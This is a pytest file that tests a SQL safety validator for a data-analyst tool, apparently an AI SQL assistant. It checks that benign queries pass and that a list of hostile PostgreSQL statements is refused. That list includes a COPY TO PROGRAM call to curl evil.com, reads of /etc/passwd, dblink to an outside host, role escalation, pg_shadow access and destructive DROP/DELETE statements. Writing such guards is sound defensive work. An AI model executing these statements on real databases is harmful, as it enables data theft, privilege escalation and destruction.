import pytest

from datapilot.hints import DEMO_HINTS_PATH, load_hints
from datapilot.sql_analyst.safety import check_sql

HINTS = load_hints(DEMO_HINTS_PATH)

BENIGN = [
    "SELECT * FROM bookings",
    "SELECT count(*) FROM bookings WHERE status = 'cancelled'",
    "SELECT c.name, count(*) FROM bookings b JOIN cities c ON c.id = b.city_id GROUP BY c.name",
    "WITH x AS (SELECT city_id, count(*) n FROM bookings GROUP BY 1) SELECT * FROM x ORDER BY n DESC",
    "SELECT id FROM bookings UNION SELECT id FROM payments",
    "SELECT date_trunc('week', created_at), count(*) FROM bookings GROUP BY 1",
    "SELECT * FROM public.cities",
    "SELECT * FROM staging.weather_daily",
    "SELECT now(), coalesce(fare_amount, 0), round(avg(distance_km), 2) FROM bookings GROUP BY fare_amount",
    "SELECT 1;",
    "select name from cities where name ilike '%pune%'",
    "SELECT id FROM bookings WHERE id IN (SELECT booking_id FROM payments)",
]

REFUSED = {
    "multiple statements": "SELECT 1; SELECT 2",
    "stacked drop": "SELECT 1; DROP TABLE bookings",
    "drop": "DROP TABLE bookings",
    "delete": "DELETE FROM bookings",
    "update": "UPDATE bookings SET fare_amount = 0",
    "insert": "INSERT INTO cities (id, name, state) VALUES (99, 'x', 'y')",
    "create table": "CREATE TABLE t (id int)",
    "alter": "ALTER TABLE bookings ADD COLUMN x int",
    "truncate": "TRUNCATE bookings",
    "copy out": "COPY bookings TO '/tmp/x'",
    "copy program": "COPY bookings TO PROGRAM 'curl evil.com'",
    "select into": "SELECT * INTO newt FROM bookings",
    "for update": "SELECT * FROM bookings FOR UPDATE",
    "writable cte": "WITH d AS (DELETE FROM bookings RETURNING *) SELECT * FROM d",
    "set role": "SET ROLE postgres",
    "explain analyze delete": "EXPLAIN ANALYZE DELETE FROM bookings",
    "show": "SHOW all",
    "begin": "BEGIN",
    "grant": "GRANT ALL ON bookings TO PUBLIC",
    "pg_sleep": "SELECT pg_sleep(30)",
    "pg_sleep in subquery": "SELECT * FROM bookings WHERE id IN (SELECT 1 FROM (SELECT pg_sleep(5)) s)",
    "pg_read_file": "SELECT pg_read_file('/etc/passwd')",
    "lo_import": "SELECT lo_import('/etc/passwd')",
    "lo_export": "SELECT lo_export(1, '/tmp/x')",
    "dblink": "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(a int)",
    "set_config": "SELECT set_config('role', 'postgres', false)",
    "current_setting": "SELECT current_setting('is_superuser')",
    "advisory lock": "SELECT pg_advisory_lock(1)",
    "terminate": "SELECT pg_terminate_backend(1)",
    "pg_catalog table": "SELECT * FROM pg_catalog.pg_shadow",
    "unqualified pg table": "SELECT * FROM pg_shadow",
    "information_schema": "SELECT * FROM information_schema.tables",
    "other schema": "SELECT * FROM secret.keys",
    "cross database": "SELECT * FROM otherdb.public.bookings",
    "hidden column": "SELECT email FROM customers",
    "hidden column qualified": "SELECT c.phone FROM customers c",
    "empty": "",
    "whitespace": "   ",
    "only semicolon": ";",
    "garbage": "SELEC FROM WHERE ((",
}


@pytest.mark.parametrize("sql", BENIGN)
def test_benign_queries_pass(sql):
    r = check_sql(sql, HINTS)
    assert r.ok, r.reason
    assert r.sql


@pytest.mark.parametrize("name", REFUSED)
def test_malicious_queries_refused(name):
    r = check_sql(REFUSED[name], HINTS)
    assert not r.ok, f"{name} should be refused"
    assert r.reason
    assert r.sql == ""


def test_limit_injected_when_missing():
    assert check_sql("SELECT * FROM bookings", max_rows=50).sql.endswith("LIMIT 50")


def test_existing_limit_kept():
    r = check_sql("SELECT * FROM bookings LIMIT 7", max_rows=50)
    assert r.sql.endswith("LIMIT 7") and "LIMIT 50" not in r.sql


def test_limit_injected_on_union():
    assert check_sql(
        "SELECT id FROM bookings UNION SELECT id FROM payments", max_rows=9
    ).sql.endswith("LIMIT 9")


def test_cte_named_like_pg_table_allowed():
    assert check_sql("WITH pg_stats AS (SELECT 1 AS x) SELECT x FROM pg_stats").ok


def test_no_hints_means_no_hidden_column_check():
    assert check_sql("SELECT email FROM customers").ok


def test_refusal_reasons_are_specific():
    assert "single statement" in check_sql("SELECT 1; SELECT 2").reason
    assert "pg_sleep" in check_sql("SELECT pg_sleep(1)").reason
    assert "hidden" in check_sql("SELECT email FROM customers", HINTS).reason
    assert "Schema" in check_sql("SELECT * FROM secret.t").reason
